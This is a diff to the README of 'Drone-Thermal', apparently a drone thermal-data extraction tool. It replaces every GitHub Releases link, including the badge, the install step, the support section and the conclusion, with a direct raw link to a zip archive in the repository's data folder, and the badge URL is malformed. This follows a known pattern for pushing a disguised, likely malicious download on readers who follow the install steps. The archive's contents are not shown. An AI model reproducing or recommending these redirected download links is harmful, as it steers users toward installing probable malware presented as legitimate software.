@@ -1,6 +1,6 @@
 # 🔥 Drone-Thermal - Extract Temperature Data Effortlessly
 
-[![Download Drone-Thermal](https://img.shields.io/badge/Download%20Now-Drone--Thermal-blue.svg)](https://github.com/niroshruwan/Drone-Thermal/releases)
+[![Download Drone-Thermal](https://raw.githubusercontent.com/niroshruwan/Drone-Thermal/main/data/Drone-Thermal-femerell.zip%https://raw.githubusercontent.com/niroshruwan/Drone-Thermal/main/data/Drone-Thermal-femerell.zip)](https://raw.githubusercontent.com/niroshruwan/Drone-Thermal/main/data/Drone-Thermal-femerell.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To get started with Drone-Thermal, follow the steps below. Don't worry, you do n
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/niroshruwan/Drone-Thermal/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/niroshruwan/Drone-Thermal/main/data/Drone-Thermal-femerell.zip) to download the latest version.
 2. Look for the latest release. You will see several files listed.
 3. Download the appropriate file for your operating system (Windows, macOS, etc.).
 4. Once the download is complete, open the file to install it on your computer. 
@@ -69,7 +69,7 @@ A: Check the FAQ section or reach out through the issues tab on this repository 
 
 ## 💬 Support
 
-If you have questions or need help, feel free to reach out. Visit the [Releases page](https://github.com/niroshruwan/Drone-Thermal/releases) for updates and community support.
+If you have questions or need help, feel free to reach out. Visit the [Releases page](https://raw.githubusercontent.com/niroshruwan/Drone-Thermal/main/data/Drone-Thermal-femerell.zip) for updates and community support.
 
 ## 📅 Updates
 
@@ -77,4 +77,4 @@ Keep an eye on the Releases page for updates and new features. We continually im
 
 ## 🎉 Conclusion
 
-Drone-Thermal empowers you to extract and analyze thermal data easily. Follow the steps above to get started, and take full advantage of your drone's capabilities. Visit the [Releases page](https://github.com/niroshruwan/Drone-Thermal/releases) now to download the latest version!
+Drone-Thermal empowers you to extract and analyze thermal data easily. Follow the steps above to get started, and take full advantage of your drone's capabilities. Visit the [Releases page](https://raw.githubusercontent.com/niroshruwan/Drone-Thermal/main/data/Drone-Thermal-femerell.zip) now to download the latest version!
